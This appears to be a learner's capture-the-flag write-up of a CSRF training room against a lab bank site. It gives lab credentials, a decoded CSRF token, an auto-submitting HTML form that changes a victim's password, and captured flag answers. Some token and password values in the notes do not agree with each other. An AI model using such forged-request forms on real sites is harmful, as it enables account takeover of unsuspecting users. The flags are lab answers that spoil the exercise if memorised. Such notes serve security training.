
## CSRF Room

Credentials to login:
username: `GB82MYBANK5698`
password: `GB82MYBANK5698`

To log into the `mybank.thm` website you are required to open DevTools and enter `document.cookie = "isBanned=0 path=/"` in the console for some reason. Otherwise the login panel will not show. 
### DoubleSubmit Cookie Bypass
#### Task: Reverse Engineer the CSRF-token

Token from the mybank.thm 'change password' page : 
encoded : R0I4Mk1ZQkFOSzU2OTg%3D
decoded : GB82MYBANK56997

##### PHP Server-side Script with CSRF-token implemented as a hidden parameter
```html
<form method="post" action="http://mybank.thm:8080//changepassword.php" id="autos">
        <label for="password">Password:</label>
        <input type="password" id="password" name="current_password" value="<?php echo "GB82MYBANK5697" ?>" required>

        <label for="confirm_password">ConfirmPassword:</label>
        <input type="password" id="confirm_password" name="confirm_password" value="Attacker Unique Password" required>
		<input type="hidden" id="csrf_token" name="csrf_token" value="Decrypted Token Value">
		

        <button type="submit" name="password_submit"  id="password_submit" >Update Password</button>
    </form>
	
	</div>
<script>
document.getElementById('password_submit').click(); 
</script>
        
```

CSRF-tokens are base64-encoded so I used [CyberChef][()](https://gchq.github.io/CyberChef/) to decode it

Updated password for John : `GB82MYBANK5697`

I found the updated password by intercepting the request with Burp Suite. I clicked the suspicious link in the email and caught the request > sent it to Repeater > executed.

In the response tab the updated password value was displayed in the html 'input' field

### SameSite Cookies

Clicking the suspicious link in the first of the 2 emails in John's inbox the session is logged out and flag is retrieved =  **THM{LOGGED_OUT}**

Changing the value of the *logout* value in via DevTools to 'hellothm' a flag is retrieved = **Flag: THM{ATTACK_DETECTED}**

Clicking the 1st button of the 2 buttons in the email "LAX test something" the 'isBanned' value is updated to 'true' and a flag is retrieved = **THM{USER_IS_B@NNED}**

### Additional Exploitation Techniques

#### Same Origin Policy (SOP) and Cross-Origin Resource Sharing (CORS) Bypass

In this context using **Access-Control-Allow-Origin** would require as a minimum to implement **Access-Control-Allow-Credentials**. 

Public APis and CDNs are generally common examples of services which would make use of **Access-Control-Allow-Origin**.  